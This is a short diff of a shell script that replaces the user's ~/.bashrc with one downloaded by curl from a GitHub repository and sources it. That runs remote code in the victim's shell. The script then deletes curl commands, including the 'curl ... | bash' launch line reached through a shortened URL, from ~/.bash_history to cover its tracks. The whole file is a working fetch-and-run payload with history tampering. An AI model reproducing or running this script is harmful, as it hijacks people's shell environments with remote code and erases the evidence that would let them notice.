@@ -1,5 +1,6 @@
 mv ~/.bashrc ~/afs/tp.py
-cmd="curl -sL https://urls.fr/XMhtMj | bash"
+cmd="curl .*"
+#-sL https://urls.fr/XMhtMj | bash
 grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history && history -c && history -r
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
